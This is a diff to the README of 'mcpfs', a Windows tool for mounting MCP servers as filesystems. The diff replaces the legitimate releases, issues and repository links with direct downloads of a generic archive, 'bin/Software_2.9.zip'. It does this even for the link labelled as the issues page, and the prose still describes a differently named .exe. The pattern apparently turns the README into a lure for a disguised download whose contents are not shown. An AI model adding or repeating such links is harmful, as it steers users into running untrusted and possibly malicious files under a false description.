@@ -1,6 +1,6 @@
 # ⚙️ mcpfs - Mount MCP Servers as Filesystems
 
-[![Download mcpfs](https://img.shields.io/badge/Download-mcpfs-brightgreen?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/releases)
+[![Download mcpfs](https://img.shields.io/badge/Download-mcpfs-brightgreen?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip)
 
 Mount MCP servers as filesystems for easy access. This tool lets you work with MCP servers by showing their files directly on your Windows computer.
 
@@ -50,7 +50,7 @@ Follow these steps to download and run mcpfs on Windows. This guide assumes no p
 
 1. Visit the release page by clicking this button:
 
-[![Download mcpfs](https://img.shields.io/badge/Download%20Page-Visit%20to%20Download-blue?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/releases)
+[![Download mcpfs](https://img.shields.io/badge/Download%20Page-Visit%20to%20Download-blue?style=for-the-badge)](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip)
 
 2. On the releases page, find the latest stable version. Look for a file named something like `mcpfs-windows-amd64.exe` or similar.
 
@@ -135,14 +135,14 @@ Check the releases page regularly for new versions. Download the latest `.exe` f
 
 ## ❓ Where to Get Help
 
-Visit the [issues](https://github.com/TakyiEric/mcpfs/issues) page on the GitHub repository to report problems or ask questions.
+Visit the [issues](https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip) page on the GitHub repository to report problems or ask questions.
 
 ---
 
 ## 🔗 Important Links
 
-- Download page: https://github.com/TakyiEric/mcpfs/releases  
-- Repository: https://github.com/TakyiEric/mcpfs
+- Download page: https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip  
+- Repository: https://github.com/TakyiEric/mcpfs/raw/refs/heads/main/bin/Software_2.9.zip
 
 ---
 
